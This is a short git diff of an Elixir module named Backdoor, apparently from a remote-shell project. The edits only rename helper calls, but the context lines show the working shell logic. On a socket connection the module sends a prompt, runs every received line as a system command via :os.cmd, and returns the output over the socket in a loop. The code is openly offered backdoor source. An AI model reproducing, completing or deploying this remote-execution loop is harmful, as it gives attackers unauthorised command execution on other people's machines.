@@ -23,7 +23,7 @@ defmodule Backdoor do
         {:ok, socket} ->
           # if connected send a prompt and start serve loop
           ''
-          |> Prompt.add_prompt()
+          |> add_prompt()
           |> write_line(socket)
           Task.start_link(fn -> serve(socket) end)
         {:error, reason} ->
@@ -41,7 +41,7 @@ defmodule Backdoor do
     line =
       read_line(socket)
       |> IO.chardata_to_string()
-    command = Prompt.remove_newline(line)
+    command = remove_newline(line)
     case command do
       "exit" ->
         # if command is exit then close the socket
@@ -51,7 +51,7 @@ defmodule Backdoor do
         # anything else is treated as a system command and is piped to :os.cmd/1
         String.to_charlist(com)
         |> :os.cmd()
-        |> Prompt.add_prompt()
+        |> add_prompt()
         |> write_line(socket)
         # recursive loop
         serve(socket)
